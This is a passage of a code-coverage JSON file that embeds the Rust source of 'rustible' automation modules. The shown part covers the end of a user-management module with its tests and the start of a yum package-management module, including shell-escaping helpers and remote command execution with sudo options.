..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let connection = match context.connection.as_ref() {\n            Some(c) =\u003e c,\n            None =\u003e return Ok(None),\n        };\n\n        let name = params.get_string_required(\"name\")?;\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = UserState::from_str(\u0026state_str)?;\n\n        let user_info = Self::get_user_info_via_connection(connection, \u0026name, context)?;\n\n        let before = if let Some(info) = \u0026user_info {\n            format!(\n                \"user: {}\\nuid: {}\\ngid: {}\\nhome: {}\\nshell: {}\\ngroups: {}\",\n                info.name,\n                info.uid,\n                info.gid,\n                info.home,\n                info.shell,\n                info.groups.join(\",\")\n            )\n        } else {\n            \"user: (absent)\".to_string()\n        };\n\n        let after = match state {\n            UserState::Absent =\u003e \"user: (absent)\".to_string(),\n            UserState::Present =\u003e {\n                if user_info.is_some() {\n                    before.clone()\n                } else {\n                    format!(\"user: {} (will be created)\", name)\n                }\n            }\n        };\n\n        if before == after {\n            Ok(None)\n        } else {\n            Ok(Some(Diff::new(before, after)))\n        }\n    }\n}\n\n/// Escape a string for safe use in shell commands\nfn shell_escape(s: \u0026str) -\u003e String {\n    // Simple escape: wrap in single quotes and escape any single quotes\n    if s.chars()\n        .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '/')\n    {\n        s.to_string()\n    } else {\n        format!(\"'{}'\", s.replace('\\'', \"'\\\\''\"))\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_user_state_from_str() {\n        assert_eq!(UserState::from_str(\"present\").unwrap(), UserState::Present);\n        assert_eq!(UserState::from_str(\"absent\").unwrap(), UserState::Absent);\n        assert!(UserState::from_str(\"invalid\").is_err());\n    }\n\n    #[test]\n    fn test_shell_escape() {\n        assert_eq!(shell_escape(\"simple\"), \"simple\");\n        assert_eq!(shell_escape(\"with space\"), \"'with space'\");\n        assert_eq!(shell_escape(\"with'quote\"), \"'with'\\\\''quote'\");\n        assert_eq!(shell_escape(\"/usr/bin/bash\"), \"/usr/bin/bash\");\n    }\n\n    #[test]\n    fn test_user_module_name() {\n        let module = UserModule;\n        assert_eq!(module.name(), \"user\");\n    }\n\n    #[test]\n    fn test_user_module_classification() {\n        let module = UserModule;\n        assert_eq!(module.classification(), ModuleClassification::RemoteCommand);\n    }\n\n    #[test]\n    fn test_user_module_required_params() {\n        let module = UserModule;\n        assert_eq!(module.required_params(), \u0026[\"name\"]);\n    }\n}\n","traces":[{"line":22,"address":[32464441,32463904,32464447],"length":1,"stats":{"Line":1}},{"line":23,"address":[32463931,32464033],"length":1,"stats":{"Line":2}},{"line":24,"address":[32464049,32464120],"length":1,"stats":{"Line":2}},{"line":25,"address":[32464189,32464092,32464146],"length":1,"stats":{"Line":3}},{"line":26,"address":[32464211,32464157],"length":1,"stats":{"Line":2}},{"line":51,"address":[32441168,32441844,32441965],"length":1,"stats":{"Line":0}},{"line":52,"address":[32441198],"length":1,"stats":{"Line":0}},{"line":53,"address":[32441253],"length":1,"stats":{"Line":0}},{"line":54,"address":[32441327,32441406,32441834],"length":1,"stats":{"Line":0}},{"line":55,"address":[32441538,32441821],"length":1,"stats":{"Line":0}},{"line":56,"address":[32441652,32441592,32441700],"length":1,"stats":{"Line":0}},{"line":59,"address":[32441267],"length":1,"stats":{"Line":0}},{"line":63,"address":[32441141,32440160,32441106],"length":1,"stats":{"Line":0}},{"line":68,"address":[32440237],"length":1,"stats":{"Line":0}},{"line":71,"address":[32440263,32440642,32440561,32440357],"length":1,"stats":{"Line":0}},{"line":72,"address":[32440373],"length":1,"stats":{"Line":0}},{"line":73,"address":[24346006,24345984],"length":1,"stats":{"Line":0}},{"line":75,"address":[32440859],"length":1,"stats":{"Line":0}},{"line":79,"address":[32451846,32451840,32451104],"length":1,"stats":{"Line":0}},{"line":84,"address":[32451202],"length":1,"stats":{"Line":0}},{"line":85,"address":[32451399,32451485],"length":1,"stats":{"Line":0}},{"line":86,"address":[32451784],"length":1,"stats":{"Line":0}},{"line":90,"address":[32457119,32453312,32456792],"length":1,"stats":{"Line":0}},{"line":96,"address":[32453383],"length":1,"stats":{"Line":0}},{"line":97,"address":[32453737,32457117,32453630],"length":1,"stats":{"Line":0}},{"line":99,"address":[32454183,32454120],"length":1,"stats":{"Line":0}},{"line":100,"address":[32454134],"length":1,"stats":{"Line":0}},{"line":104,"address":[32454300],"length":1,"stats":{"Line":0}},{"line":105,"address":[32454508,32454429],"length":1,"stats":{"Line":0}},{"line":106,"address":[32454561,32456839],"length":1,"stats":{"Line":0}},{"line":112,"address":[32454514,32454599],"length":1,"stats":{"Line":0}},{"line":113,"address":[32454711],"length":1,"stats":{"Line":0}},{"line":116,"address":[32454858],"length":1,"stats":{"Line":0}},{"line":117,"address":[32455458],"length":1,"stats":{"Line":0}},{"line":120,"address":[32455567],"length":1,"stats":{"Line":0}},{"line":121,"address":[32455825,32455600],"length":1,"stats":{"Line":0}},{"line":126,"address":[24346432,24346485],"length":1,"stats":{"Line":0}},{"line":129,"address":[32455617,32455573],"length":1,"stats":{"Line":0}},{"line":132,"address":[32456289],"length":1,"stats":{"Line":0}},{"line":133,"address":[32455879,32455619],"length":1,"stats":{"Line":0}},{"line":136,"address":[32455905,32455990],"length":1,"stats":{"Line":0}},{"line":137,"address":[32456016,32456101],"length":1,"stats":{"Line":0}},{"line":138,"address":[32456127,32456212],"length":1,"stats":{"Line":0}},{"line":139,"address":[32456257],"length":1,"stats":{"Line":0}},{"line":144,"address":[32442000,32444090,32445247],"length":1,"stats":{"Line":0}},{"line":157,"address":[32442660,32442390,32445260],"length":1,"stats":{"Line":0}},{"line":159,"address":[32442673,32442643],"length":1,"stats":{"Line":0}},{"line":160,"address":[32442687,32442802],"length":1,"stats":{"Line":0}},{"line":161,"address":[32442829],"length":1,"stats":{"Line":0}},{"line":164,"address":[32442888,32442718],"length":1,"stats":{"Line":0}},{"line":165,"address":[32442997,32442930],"length":1,"stats":{"Line":0}},{"line":166,"address":[32443042],"length":1,"stats":{"Line":0}},{"line":169,"address":[32442961,32443078],"length":1,"stats":{"Line":0}},{"line":170,"address":[32443120,32443175],"length":1,"stats":{"Line":0}},{"line":171,"address":[32443181],"length":1,"stats":{"Line":0}},{"line":172,"address":[32443249],"length":1,"stats":{"Line":0}},{"line":176,"address":[32443313,32443131],"length":1,"stats":{"Line":0}},{"line":177,"address":[32443422,32443355],"length":1,"stats":{"Line":0}},{"line":178,"address":[32443467],"length":1,"stats":{"Line":0}},{"line":181,"address":[32443386,32443503],"length":1,"stats":{"Line":0}},{"line":182,"address":[32443612,32443545],"length":1,"stats":{"Line":0}},{"line":183,"address":[32443657],"length":1,"stats":{"Line":0}},{"line":186,"address":[32443693,32443576],"length":1,"stats":{"Line":0}},{"line":187,"address":[32443735,32443786],"length":1,"stats":{"Line":0}},{"line":188,"address":[32443823],"length":1,"stats":{"Line":0}},{"line":191,"address":[32443773],"length":1,"stats":{"Line":0}},{"line":192,"address":[32444200,32444127],"length":1,"stats":{"Line":0}},{"line":194,"address":[32444158,32444096],"length":1,"stats":{"Line":0}},{"line":197,"address":[32444194],"length":1,"stats":{"Line":0}},{"line":198,"address":[32444260],"length":1,"stats":{"Line":0}},{"line":201,"address":[32444253,32444320],"length":1,"stats":{"Line":0}},{"line":203,"address":[32444347],"length":1,"stats":{"Line":0}},{"line":204,"address":[32444521,32444426],"length":1,"stats":{"Line":0}},{"line":206,"address":[32445093,32444906],"length":1,"stats":{"Line":0}},{"line":207,"address":[32445103],"length":1,"stats":{"Line":0}},{"line":209,"address":[32444924],"length":1,"stats":{"Line":0}},{"line":214,"address":[32446768,32451085,32449072],"length":1,"stats":{"Line":0}},{"line":227,"address":[32447095,32447474,32447347],"length":1,"stats":{"Line":0}},{"line":228,"address":[32447318,32447410],"length":1,"stats":{"Line":0}},{"line":230,"address":[32447755],"length":1,"stats":{"Line":0}},{"line":231,"address":[32447830,32447773,32451080],"length":1,"stats":{"Line":0}},{"line":233,"address":[32448054],"length":1,"stats":{"Line":0}},{"line":234,"address":[32448303,32448083],"length":1,"stats":{"Line":0}},{"line":235,"address":[32448139,32448214],"length":1,"stats":{"Line":0}},{"line":236,"address":[32448241],"length":1,"stats":{"Line":0}},{"line":237,"address":[32448295],"length":1,"stats":{"Line":0}},{"line":241,"address":[32448308,32448504,32448099],"length":1,"stats":{"Line":0}},{"line":242,"address":[32448417,32448350],"length":1,"stats":{"Line":0}},{"line":243,"address":[32448462],"length":1,"stats":{"Line":0}},{"line":244,"address":[32448496],"length":1,"stats":{"Line":0}},{"line":247,"address":[32448381,32448506],"length":1,"stats":{"Line":0}},{"line":248,"address":[32448888,32448603,32448548],"length":1,"stats":{"Line":0}},{"line":249,"address":[32448619],"length":1,"stats":{"Line":0}},{"line":250,"address":[32448666],"length":1,"stats":{"Line":0}},{"line":251,"address":[32448893,32448701],"length":1,"stats":{"Line":0}},{"line":252,"address":[32448920],"length":1,"stats":{"Line":0}},{"line":253,"address":[32448978],"length":1,"stats":{"Line":0}},{"line":255,"address":[32448776,32448670],"length":1,"stats":{"Line":0}},{"line":256,"address":[32448803],"length":1,"stats":{"Line":0}},{"line":258,"address":[32448872],"length":1,"stats":{"Line":0}},{"line":262,"address":[32448559,32449078],"length":1,"stats":{"Line":0}},{"line":263,"address":[32449181,32449110,32449324],"length":1,"stats":{"Line":0}},{"line":264,"address":[32449187],"length":1,"stats":{"Line":0}},{"line":265,"address":[32449245],"length":1,"stats":{"Line":0}},{"line":266,"address":[32449310],"length":1,"stats":{"Line":0}},{"line":267,"address":[32449329],"length":1,"stats":{"Line":0}},{"line":269,"address":[32449316],"length":1,"stats":{"Line":0}},{"line":273,"address":[32449137,32449389],"length":1,"stats":{"Line":0}},{"line":274,"address":[32449492,32449622,32449421],"length":1,"stats":{"Line":0}},{"line":275,"address":[32449498],"length":1,"stats":{"Line":0}},{"line":276,"address":[32449556],"length":1,"stats":{"Line":0}},{"line":277,"address":[32449614],"length":1,"stats":{"Line":0}},{"line":281,"address":[32449448,32449627],"length":1,"stats":{"Line":0}},{"line":282,"address":[32450059,32449659,32449709],"length":1,"stats":{"Line":0}},{"line":283,"address":[32449715],"length":1,"stats":{"Line":0}},{"line":284,"address":[32449773],"length":1,"stats":{"Line":0}},{"line":285,"address":[32450051],"length":1,"stats":{"Line":0}},{"line":289,"address":[32449686],"length":1,"stats":{"Line":0}},{"line":290,"address":[32450069],"length":1,"stats":{"Line":0}},{"line":293,"address":[32450141,32450088],"length":1,"stats":{"Line":0}},{"line":295,"address":[32450168],"length":1,"stats":{"Line":0}},{"line":296,"address":[32450247,32450339],"length":1,"stats":{"Line":0}},{"line":298,"address":[32450721,32450905],"length":1,"stats":{"Line":0}},{"line":299,"address":[32450912],"length":1,"stats":{"Line":0}},{"line":301,"address":[32450736],"length":1,"stats":{"Line":0}},{"line":306,"address":[32446743,32445264,32446705],"length":1,"stats":{"Line":0}},{"line":313,"address":[32445647,32446756,32445399],"length":1,"stats":{"Line":0}},{"line":315,"address":[32445641],"length":1,"stats":{"Line":0}},{"line":316,"address":[32445670,32445742],"length":1,"stats":{"Line":0}},{"line":319,"address":[32445664],"length":1,"stats":{"Line":0}},{"line":320,"address":[32445793],"length":1,"stats":{"Line":0}},{"line":323,"address":[32445786,32445850],"length":1,"stats":{"Line":0}},{"line":325,"address":[32445874],"length":1,"stats":{"Line":0}},{"line":326,"address":[32446039,32445950],"length":1,"stats":{"Line":0}},{"line":328,"address":[32446421,32446605],"length":1,"stats":{"Line":0}},{"line":329,"address":[32446612],"length":1,"stats":{"Line":0}},{"line":331,"address":[32446436],"length":1,"stats":{"Line":0}},{"line":336,"address":[32451872,32453274,32453293],"length":1,"stats":{"Line":0}},{"line":344,"address":[32451986],"length":1,"stats":{"Line":0}},{"line":345,"address":[32452154,32452102],"length":1,"stats":{"Line":0}},{"line":347,"address":[32452050],"length":1,"stats":{"Line":0}},{"line":348,"address":[32452065],"length":1,"stats":{"Line":0}},{"line":352,"address":[32452489,32452575],"length":1,"stats":{"Line":0}},{"line":354,"address":[32453008,32452949],"length":1,"stats":{"Line":0}},{"line":355,"address":[32452995],"length":1,"stats":{"Line":0}},{"line":357,"address":[32452963,32453013],"length":1,"stats":{"Line":0}},{"line":365,"address":[32457136,32463396,32463521],"length":1,"stats":{"Line":0}},{"line":376,"address":[32457776,32457407,32457646],"length":1,"stats":{"Line":0}},{"line":377,"address":[24347056,24347081],"length":1,"stats":{"Line":0}},{"line":380,"address":[24347008,24347030],"length":1,"stats":{"Line":0}},{"line":381,"address":[32458128],"length":1,"stats":{"Line":0}},{"line":384,"address":[32458182,32458273],"length":1,"stats":{"Line":0}},{"line":385,"address":[32463482,32458486,32458593],"length":1,"stats":{"Line":0}},{"line":386,"address":[32458896],"length":1,"stats":{"Line":0}},{"line":387,"address":[32458945],"length":1,"stats":{"Line":0}},{"line":391,"address":[32458967,32458902],"length":1,"stats":{"Line":0}},{"line":392,"address":[32459173,32459342,32459236,32459438],"length":1,"stats":{"Line":0}},{"line":394,"address":[32459166,32459075],"length":1,"stats":{"Line":0}},{"line":397,"address":[32459213,32459304],"length":1,"stats":{"Line":0}},{"line":398,"address":[32459319,32459407],"length":1,"stats":{"Line":0}},{"line":400,"address":[32459902,32460009,32463442],"length":1,"stats":{"Line":0}},{"line":403,"address":[32460300],"length":1,"stats":{"Line":0}},{"line":405,"address":[24346769,24346736],"length":1,"stats":{"Line":0}},{"line":408,"address":[32460651,32460599],"length":1,"stats":{"Line":0}},{"line":412,"address":[32460539,32460454],"length":1,"stats":{"Line":0}},{"line":414,"address":[32460562],"length":1,"stats":{"Line":0}},{"line":417,"address":[32461108,32463402,32461203],"length":1,"stats":{"Line":0}},{"line":418,"address":[32461580],"length":1,"stats":{"Line":0}},{"line":419,"address":[32461675,32461594],"length":1,"stats":{"Line":0}},{"line":426,"address":[32462229,32461621,32462062,32461968,32462153],"length":1,"stats":{"Line":0}},{"line":430,"address":[32461655,32461936],"length":1,"stats":{"Line":0}},{"line":431,"address":[32462030,32461951],"length":1,"stats":{"Line":0}},{"line":432,"address":[32462045,32462121],"length":1,"stats":{"Line":0}},{"line":433,"address":[32462136,32462212],"length":1,"stats":{"Line":0}},{"line":435,"address":[32462868,32462775],"length":1,"stats":{"Line":0}},{"line":437,"address":[32463151],"length":1,"stats":{"Line":0}},{"line":442,"address":[32426576],"length":1,"stats":{"Line":1}},{"line":446,"address":[32423696],"length":1,"stats":{"Line":0}},{"line":450,"address":[32423728],"length":1,"stats":{"Line":1}},{"line":454,"address":[32423744],"length":1,"stats":{"Line":1}},{"line":458,"address":[32440140,32427040,32437476],"length":1,"stats":{"Line":0}},{"line":463,"address":[32427376,32427154],"length":1,"stats":{"Line":0}},{"line":464,"address":[24344303],"length":1,"stats":{"Line":0}},{"line":465,"address":[24344270],"length":1,"stats":{"Line":0}},{"line":469,"address":[32427433],"length":1,"stats":{"Line":0}},{"line":470,"address":[32427856,32440138,32427772],"length":1,"stats":{"Line":0}},{"line":472,"address":[32427913],"length":1,"stats":{"Line":0}},{"line":473,"address":[32440117,32428042,32427951],"length":1,"stats":{"Line":0}},{"line":475,"address":[32428203,32440115],"length":1,"stats":{"Line":0}},{"line":476,"address":[32440113,32428405],"length":1,"stats":{"Line":0}},{"line":477,"address":[32428716,32440092,32428629],"length":1,"stats":{"Line":0}},{"line":478,"address":[32428897,32428984],"length":1,"stats":{"Line":0}},{"line":479,"address":[32428993,32440071],"length":1,"stats":{"Line":0}},{"line":480,"address":[32429217,32429304,32440050],"length":1,"stats":{"Line":0}},{"line":481,"address":[32429572,32429485,32440029],"length":1,"stats":{"Line":0}},{"line":482,"address":[32429753,32429843],"length":1,"stats":{"Line":0}},{"line":483,"address":[32429852],"length":1,"stats":{"Line":0}},{"line":484,"address":[32429904],"length":1,"stats":{"Line":0}},{"line":485,"address":[32429956],"length":1,"stats":{"Line":0}},{"line":486,"address":[32430008],"length":1,"stats":{"Line":0}},{"line":487,"address":[32430060,32440008],"length":1,"stats":{"Line":0}},{"line":488,"address":[32430374,32430284],"length":1,"stats":{"Line":0}},{"line":489,"address":[32430383],"length":1,"stats":{"Line":0}},{"line":490,"address":[32430562,32430478,32439987],"length":1,"stats":{"Line":0}},{"line":492,"address":[32430619],"length":1,"stats":{"Line":0}},{"line":493,"address":[32430657,32430744,32439966],"length":1,"stats":{"Line":0}},{"line":494,"address":[32439964,32430926],"length":1,"stats":{"Line":0}},{"line":495,"address":[32431237,32431150,32439943],"length":1,"stats":{"Line":0}},{"line":496,"address":[32431505,32431418,32439922],"length":1,"stats":{"Line":0}},{"line":498,"address":[32431793,32431686,32439898],"length":1,"stats":{"Line":0}},{"line":500,"address":[32431956],"length":1,"stats":{"Line":0}},{"line":502,"address":[32431976],"length":1,"stats":{"Line":0}},{"line":503,"address":[32438847,32438900],"length":1,"stats":{"Line":0}},{"line":506,"address":[32438882],"length":1,"stats":{"Line":0}},{"line":507,"address":[32439087,32439744],"length":1,"stats":{"Line":0}},{"line":513,"address":[32439062,32439739,32439158],"length":1,"stats":{"Line":0}},{"line":514,"address":[32439328],"length":1,"stats":{"Line":0}},{"line":518,"address":[32431989],"length":1,"stats":{"Line":0}},{"line":519,"address":[32431997],"length":1,"stats":{"Line":0}},{"line":521,"address":[32432023],"length":1,"stats":{"Line":0}},{"line":522,"address":[32432037],"length":1,"stats":{"Line":0}},{"line":523,"address":[32432113,32433114],"length":1,"stats":{"Line":0}},{"line":531,"address":[32432082],"length":1,"stats":{"Line":0}},{"line":533,"address":[32432219],"length":1,"stats":{"Line":0}},{"line":534,"address":[32432294],"length":1,"stats":{"Line":0}},{"line":535,"address":[32432349],"length":1,"stats":{"Line":0}},{"line":536,"address":[32432416],"length":1,"stats":{"Line":0}},{"line":537,"address":[32432483],"length":1,"stats":{"Line":0}},{"line":543,"address":[32432872],"length":1,"stats":{"Line":0}},{"line":544,"address":[32432888],"length":1,"stats":{"Line":0}},{"line":547,"address":[32432056],"length":1,"stats":{"Line":0}},{"line":548,"address":[32433307,32438663],"length":1,"stats":{"Line":0}},{"line":556,"address":[32433276],"length":1,"stats":{"Line":0}},{"line":558,"address":[32433369],"length":1,"stats":{"Line":0}},{"line":559,"address":[32433444],"length":1,"stats":{"Line":0}},{"line":561,"address":[32433499],"length":1,"stats":{"Line":0}},{"line":562,"address":[32433566],"length":1,"stats":{"Line":0}},{"line":563,"address":[32433633],"length":1,"stats":{"Line":0}},{"line":568,"address":[32434043],"length":1,"stats":{"Line":0}},{"line":569,"address":[32434052],"length":1,"stats":{"Line":0}},{"line":570,"address":[32434068],"length":1,"stats":{"Line":0}},{"line":575,"address":[32433044,32434235],"length":1,"stats":{"Line":0}},{"line":576,"address":[32434251,32434685,32434730],"length":1,"stats":{"Line":0}},{"line":577,"address":[32434313,32434695],"length":1,"stats":{"Line":0}},{"line":578,"address":[32434722],"length":1,"stats":{"Line":0}},{"line":582,"address":[32434290],"length":1,"stats":{"Line":0}},{"line":583,"address":[32434387],"length":1,"stats":{"Line":0}},{"line":587,"address":[32434619],"length":1,"stats":{"Line":0}},{"line":588,"address":[32434677],"length":1,"stats":{"Line":0}},{"line":593,"address":[32434269],"length":1,"stats":{"Line":0}},{"line":594,"address":[32434777,32435535],"length":1,"stats":{"Line":0}},{"line":595,"address":[32434817,32435500],"length":1,"stats":{"Line":0}},{"line":596,"address":[32435527],"length":1,"stats":{"Line":0}},{"line":600,"address":[32434794],"length":1,"stats":{"Line":0}},{"line":601,"address":[32434891],"length":1,"stats":{"Line":0}},{"line":603,"address":[32434946],"length":1,"stats":{"Line":0}},{"line":604,"address":[32435013],"length":1,"stats":{"Line":0}},{"line":605,"address":[32435080],"length":1,"stats":{"Line":0}},{"line":609,"address":[32435490,32435415],"length":1,"stats":{"Line":0}},{"line":610,"address":[32435424],"length":1,"stats":{"Line":0}},{"line":611,"address":[32435482],"length":1,"stats":{"Line":0}},{"line":617,"address":[32434743,32435580],"length":1,"stats":{"Line":0}},{"line":618,"address":[32435976],"length":1,"stats":{"Line":0}},{"line":620,"address":[32436061],"length":1,"stats":{"Line":0}},{"line":621,"address":[32436377,32436246,32436346,32437548],"length":1,"stats":{"Line":0}},{"line":622,"address":[32436527,32437526,32436589],"length":1,"stats":{"Line":0}},{"line":623,"address":[32436742,32437504,32436808],"length":1,"stats":{"Line":0}},{"line":624,"address":[32436961,32437027,32437482],"length":1,"stats":{"Line":0}},{"line":625,"address":[32437454,32437242,32437180],"length":1,"stats":{"Line":0}},{"line":628,"address":[32436277,32437577],"length":1,"stats":{"Line":0}},{"line":629,"address":[32437719,32437626],"length":1,"stats":{"Line":0}},{"line":631,"address":[32437583,32437669],"length":1,"stats":{"Line":0}},{"line":634,"address":[32437703,32438030],"length":1,"stats":{"Line":0}},{"line":635,"address":[32437876,32438022],"length":1,"stats":{"Line":0}},{"line":637,"address":[32437821,32437931],"length":1,"stats":{"Line":0}},{"line":640,"address":[32437939,32438167,32438568,32438073],"length":1,"stats":{"Line":0}},{"line":641,"address":[32438272,32438534],"length":1,"stats":{"Line":0}},{"line":644,"address":[32438379],"length":1,"stats":{"Line":0}},{"line":649,"address":[32426608,32427008,32427014],"length":1,"stats":{"Line":0}},{"line":654,"address":[32426944],"length":1,"stats":{"Line":0}},{"line":657,"address":[32426556,32425739,32423776],"length":1,"stats":{"Line":0}},{"line":658,"address":[32423841],"length":1,"stats":{"Line":0}},{"line":659,"address":[32423913],"length":1,"stats":{"Line":0}},{"line":660,"address":[32424030],"length":1,"stats":{"Line":0}},{"line":663,"address":[32423934,32424090],"length":1,"stats":{"Line":0}},{"line":664,"address":[32426554,32424332,32424416],"length":1,"stats":{"Line":0}},{"line":666,"address":[24344172,24344160],"length":1,"stats":{"Line":0}},{"line":667,"address":[32426533,32424511,32424590],"length":1,"stats":{"Line":0}},{"line":669,"address":[32424748,32426512],"length":1,"stats":{"Line":0}},{"line":671,"address":[32425753,32424977],"length":1,"stats":{"Line":0}},{"line":672,"address":[32425030,32425255],"length":1,"stats":{"Line":0}},{"line":679,"address":[32425195,32425082],"length":1,"stats":{"Line":0}},{"line":682,"address":[32425111,32425745],"length":1,"stats":{"Line":0}},{"line":685,"address":[32425724],"length":1,"stats":{"Line":0}},{"line":686,"address":[32425755,32426069],"length":1,"stats":{"Line":0}},{"line":688,"address":[32425853,32426067,32425797],"length":1,"stats":{"Line":0}},{"line":689,"address":[32425894,32426059],"length":1,"stats":{"Line":0}},{"line":691,"address":[32425867,32425924],"length":1,"stats":{"Line":0}},{"line":696,"address":[32426124,32426285,32426048],"length":1,"stats":{"Line":0}},{"line":697,"address":[32426249],"length":1,"stats":{"Line":0}},{"line":699,"address":[32426130,32426287],"length":1,"stats":{"Line":0}},{"line":705,"address":[32463883,32463889,32463536],"length":1,"stats":{"Line":1}},{"line":707,"address":[32463620,32463595],"length":1,"stats":{"Line":2}},{"line":708,"address":[24347276,24347248],"length":1,"stats":{"Line":3}},{"line":710,"address":[32463721],"length":1,"stats":{"Line":1}},{"line":712,"address":[32463732,32463634],"length":1,"stats":{"Line":1}}],"covered":13,"coverable":306},{"path":["/","home","artur","Repositories","rustible","src","modules","yum.rs"],"content":"//! Yum module - Package management for RHEL/CentOS/Fedora systems\n//!\n//! This module manages packages using the yum package manager.\n//! It supports installing, removing, and upgrading packages.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParallelizationHint, ParamExt,\n};\nuse crate::connection::ExecuteOptions;\nuse std::collections::HashMap;\n\n/// Escape a string for safe use in shell commands\nfn shell_escape(s: \u0026str) -\u003e String {\n    // Simple escape: wrap in single quotes and escape any single quotes\n    if s.chars()\n        .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '/')\n    {\n        s.to_string()\n    } else {\n        format!(\"'{}'\", s.replace('\\'', \"'\\\\''\"))\n    }\n}\n\n/// Desired state for a package\n#[derive(Debug, Clone, PartialEq)]\npub enum YumState {\n    Present,\n    Absent,\n    Latest,\n}\n\nimpl YumState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"present\" | \"installed\" =\u003e Ok(YumState::Present),\n            \"absent\" | \"removed\" =\u003e Ok(YumState::Absent),\n            \"latest\" =\u003e Ok(YumState::Latest),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: present, absent, latest\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Module for yum package management\npub struct YumModule;\n\nimpl YumModule {\n    /// Check if a package is installed via remote connection\n    async fn is_package_installed_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        package: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let cmd = format!(\"rpm -q {}\", shell_escape(package));\n        match conn.execute(\u0026cmd, options).await {\n            Ok(result) =\u003e Ok(result.success),\n            Err(_) =\u003e Ok(false),\n        }\n    }\n\n    /// Get installed package version via remote connection\n    async fn get_installed_version_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        package: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        let cmd = format!(\n            \"rpm -q --qf '%{{VERSION}}-%{{RELEASE}}' {}\",\n            shell_escape(package)\n        );\n        match conn.execute(\u0026cmd, options).await {\n            Ok(result) if result.success =\u003e {\n                let version = result.stdout.trim().to_string();\n                if version.is_empty() {\n                    Ok(None)\n                } else {\n                    Ok(Some(version))\n                }\n            }\n            _ =\u003e Ok(None),\n        }\n    }\n\n    /// Execute yum command via remote connection\n    async fn run_yum_command_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        args: \u0026[\u0026str],\n        packages: \u0026[String],\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003c(bool, String, String)\u003e {\n        let mut cmd_parts: Vec\u003cString\u003e = vec![\"yum\".to_string()];\n        cmd_parts.extend(args.iter().map(|s| s.to_string()));\n        cmd_parts.extend(packages.iter().map(|s| shell_escape(s)));\n\n        let cmd = cmd_parts.join(\" \");\n\n        let result = conn\n            .execute(\u0026cmd, options)\n            .await\n            .map_err(|e| ModuleError::ExecutionFailed(format!(\"Failed to execute yum: {}\", e)))?;\n\n        Ok((result.success, result.stdout, result.stderr))\n    }\n\n    /// Update yum cache via remote connection\n    async fn update_cache_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let cmd = \"yum makecache\";\n        let result = conn\n            .execute(cmd, options)\n            .await\n            .map_err(|e| ModuleError::ExecutionFailed(format!(\"Failed to update cache: {}\", e)))?;\n\n        if result.success {\n            Ok(())\n        } else {\n            Err(ModuleError::ExecutionFailed(format!(\n                \"Failed to update cache: {}\",\n                result.stderr\n            )))\n        }\n    }\n\n    /// Build execution options with become/sudo if needed\n    fn build_exec_options(context: \u0026ModuleContext) -\u003e ExecuteOptions {\n        let mut options = ExecuteOptions::new();\n\n        if context.r#become {\n            options.escalate = true;\n            options.escalate_user = context\n                .become_user\n                .clone()\n                .or_else(|| Some(\"root\".to_string()));\n            options.escalate_method = context.become_method.clone();\n        }\n\n        if let Some(ref work_dir) = context.work_dir {\n            options = options.with_cwd(work_dir);\n        }\n\n        options\n    }\n}\n\nimpl Module for YumModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"yum\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Manage packages with the yum package manager\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn parallelization_hint(\u0026self) -\u003e ParallelizationHint {\n        // Yum uses locks - only one can run per host at a time\n        ParallelizationHint::HostExclusive\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"name\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Get packages - can be a single package or a list\n        let packages: Vec\u003cString\u003e = if let Some(names) = params.get_vec_string(\"name\")? {\n            names\n        } else {\n            vec![params.get_string_required(\"name\")?]\n        };\n\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = YumState::from_str(\u0026state_str)?;\n\n        let update_cache = params.get_bool_or(\"update_cache\", false);\n        let disable_gpg_check = params.get_bool_or(\"disable_gpg_check\", false);\n        let enablerepo = params.get_string(\"enablerepo\")?;\n        let disablerepo = params.get_string(\"disablerepo\")?;\n\n        // Get connection from context\n        let conn = context.connection.as_ref().ok_or_else(|| {\n            ModuleError::ExecutionFailed(\n                \"No connection available in context. YUM module requires a remote connection.\"\n                    .to_string(),\n            )\n        })?;\n\n        // Build execution options with become/sudo\n        let exec_options = Self::build_exec_options(context);\n\n        // Use tokio runtime to execute async operations\n        let result = tokio::task::block_in_place(|| {\n            tokio::runtime::Handle::current().block_on(async {\n                // Update cache if requested\n                if update_cache \u0026\u0026 !context.check_mode {\n                    Self::update_cache_remote(conn.as_ref(), Some(exec_options.clone())).await?;\n                }\n\n                // Track what we'll do\n                let mut to_install: Vec\u003cString\u003e = Vec::new();\n                let mut to_remove: Vec\u003cString\u003e = 